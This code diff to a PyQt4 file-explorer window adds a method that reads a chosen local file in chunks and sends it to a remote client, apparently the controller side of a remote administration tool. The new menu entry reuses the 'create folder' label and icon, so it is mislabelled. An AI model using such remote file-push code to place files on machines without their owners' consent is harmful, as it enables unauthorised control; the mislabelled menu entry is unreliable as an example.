@@ -3,12 +3,16 @@ from PyQt4.QtCore import *
 from main_ui import Ui_Form
 import ast
 import os
+import string
+import random
 from libs.language import Translate
 
 # Multi Lang
 translate = Translate()
 _ = lambda _word: translate.word(_word)
 
+def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
 
 def sizeof_fmt(num, suffix=_('MEXPLORER_B')):
             for unit in ['', _('MEXPLORER_K'),
@@ -115,6 +119,7 @@ class mainPopup(QWidget, Ui_Form):
             self.emenu.addSeparator()
             self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_file.png')), _('MEXPLORER_CREATE_FILE'), self.create_file)
             self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_folder.png')), _('MEXPLORER_CREATE_FOLDER'), self.create_dir)
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_folder.png')), _('MEXPLORER_CREATE_FOLDER'), self.upload)
 
             self.emenu.exec_(self.explorerTable.mapToGlobal(point))
 
@@ -123,6 +128,35 @@ class mainPopup(QWidget, Ui_Form):
 
     def refresh(self):
         self.get_content()
+
+    def empty(self):
+        pass
+
+    def upload(self):
+        file_name = str(QFileDialog.getOpenFileName(self, _('MEXPLORER_CHOOSE_FILE'), ''))
+        name_of_file = str(file_name).split('\\')[-1].split('/')[-1]
+        session = id_generator()
+
+        if file_name and os.path.exists(file_name):
+            payload = {
+                    'file_name': name_of_file,
+                    'session': session,
+                }
+            bin = open(file_name, 'rb')
+            print 'open file for read'
+            while 1:
+                data = bin.read(1024)
+                if not data:
+                    payload['raw_data'] = 'downloadFinished'
+                    print 'upload finished'
+                    break
+                else:
+                    payload['raw_data'] = data
+                self.moderator.send_msg(payload, 'downloadMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+                print 'sent data'
+                self.callback = self.empty
+            self.callback=self.recv_content
+
 
     def create_file(self):
         text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_NEW_FILE'), _('MEXPLORER_MSG_NEW_FILE'), QLineEdit.Normal)
